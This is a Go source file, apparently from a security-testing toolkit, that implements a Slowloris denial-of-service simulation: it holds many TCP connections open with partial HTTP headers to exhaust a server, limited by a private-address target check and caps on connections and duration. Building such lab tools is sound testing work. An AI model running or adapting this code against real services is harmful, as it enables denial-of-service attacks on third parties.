// SPDX-License-Identifier: Apache-2.0
// Copyright (C) 2024 opensecstack contributors.

package network

// Slowloris simulation.
//
// Opens many TCP connections and sends partial HTTP headers very slowly,
// holding connections open to exhaust the server's connection pool.
//
// Safety guarantee: target must be a loopback or RFC 1918 address.

import (
	"context"
	"fmt"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

const (
	slowlorisDefaultConnections = 50
	slowlorisMaxConnections     = 500
)

// Slowloris simulates a Slowloris connection-exhaustion attack.
type Slowloris struct{}

// NewSlowloris returns a ready Slowloris.
func NewSlowloris() *Slowloris { return &Slowloris{} }

// Run executes the Slowloris simulation.
//
// Recognised params keys:
//   - "connections" int    — number of slow connections to hold (default 50, max 500)
//   - "duration"    string — how long to keep connections open (default "15s", max "120s")
//   - "send_interval" string — how often to send a partial header (default "3s")
func (s *Slowloris) Run(ctx context.Context, targetIP, targetPort string, params map[string]any) (*AttackResult, error) {
	if err := checkNetworkTarget(ctx, targetIP); err != nil {
		return nil, err
	}

	connCount := intParam(params, "connections", slowlorisDefaultConnections, slowlorisMaxConnections)
	dur := durationParam(params, "duration", 15*time.Second, 120*time.Second)
	sendInterval := durationParam(params, "send_interval", 3*time.Second, 60*time.Second)

	start := time.Now()
	result := &AttackResult{Technique: "Slowloris"}

	addr := net.JoinHostPort(targetIP, targetPort)
	deadline := time.Now().Add(dur)

	var (
		opened int64
		active int64
		mu     sync.Mutex
		conns  []net.Conn
	)

	// Keep connections alive by dribbling partial headers until deadline.
	ticker := time.NewTicker(sendInterval)
	defer ticker.Stop()

	// Open all connections.
	for i := 0; i < connCount; i++ {
		select {
		case <-ctx.Done():
			goto cleanup
		default:
		}

		conn, err := (&net.Dialer{Timeout: 2 * time.Second}).DialContext(ctx, "tcp", addr)
		if err != nil {
			continue
		}
		// Send the beginning of an HTTP request — no terminating \r\n\r\n.
		initialHeader := fmt.Sprintf(
			"GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: SecureLab-Slowloris\r\nAccept: */*\r\n",
			targetIP,
		)
		_ = conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
		if _, err := conn.Write([]byte(initialHeader)); err != nil {
			conn.Close()
			continue
		}
		_ = conn.SetWriteDeadline(time.Time{})

		mu.Lock()
		conns = append(conns, conn)
		mu.Unlock()
		atomic.AddInt64(&opened, 1)
		atomic.AddInt64(&active, 1)
	}

	for {
		select {
		case <-ctx.Done():
			goto cleanup
		case t := <-ticker.C:
			if t.After(deadline) {
				goto cleanup
			}
			mu.Lock()
			alive := 0
			for _, conn := range conns {
				_ = conn.SetWriteDeadline(time.Now().Add(1 * time.Second))
				_, err := conn.Write([]byte("X-SecureLab-Keep: alive\r\n"))
				_ = conn.SetWriteDeadline(time.Time{})
				if err == nil {
					alive++
				}
			}
			mu.Unlock()
			atomic.StoreInt64(&active, int64(alive))
		}
	}

cleanup:
	mu.Lock()
	for _, conn := range conns {
		conn.Close()
	}
	mu.Unlock()

	result.Duration = time.Since(start)
	o := atomic.LoadInt64(&opened)
	a := atomic.LoadInt64(&active)

	if o > 0 {
		result.Success = true
	}
	result.Evidence = append(result.Evidence,
		fmt.Sprintf("Slowloris: opened %d connections to %s, %d still active after %.1fs",
			o, addr, a, result.Duration.Seconds()))

	return result, nil
}
